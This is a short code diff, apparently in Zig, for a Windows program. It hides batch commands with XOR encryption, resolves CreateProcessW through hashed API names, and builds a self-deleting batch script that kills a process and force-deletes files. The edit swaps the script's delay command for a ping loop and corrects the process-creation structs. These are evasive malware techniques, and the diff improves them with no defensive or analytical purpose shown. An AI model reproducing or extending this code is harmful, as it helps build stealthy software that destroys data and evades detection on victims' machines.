@@ -10,7 +10,7 @@ const E = struct {
     pub const B_DEL_END = hash.xorEncrypt("\" >nul 2>&1\r\n");
     pub const B_TASKKILL = hash.xorEncrypt("taskkill /F /PID ");
     pub const B_TASKKILL_END = hash.xorEncrypt(" >nul 2>&1\r\n");
-    pub const B_TIMEOUT = hash.xorEncrypt("timeout /t 2 /nobreak >nul 2>&1\r\n");
+    pub const B_TIMEOUT = hash.xorEncrypt("ping -n 3 127.0.0.1 >nul 2>&1\r\n");
     pub const B_IF_EXIST = hash.xorEncrypt("if exist \"");
     pub const B_END = hash.xorEncrypt("\" goto loop\r\ndel /F /Q \"%~f0\" >nul 2>&1\r\nexit\r\n");
 };
@@ -174,10 +174,9 @@ fn deleteLevel3(path: []const u8) bool {
     for (0..pos) |j| batch_us[j] = batch_buf[j];
     batch_us[pos] = 0;
 
-    var si: [68]u8 = undefined;
-    @memset(&si, 0);
-    var pi: [16]u8 = undefined;
-    @memset(&pi, 0);
+    var si = std.mem.zeroes(types.STARTUPINFOW);
+    si.cb = @sizeOf(types.STARTUPINFOW);
+    var pi = std.mem.zeroes(types.PROCESS_INFORMATION);
 
     const createProc = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false;
     const CreateProcessW: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, pa: ?*const anyopaque, ta: ?*const anyopaque, ih: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(createProc));
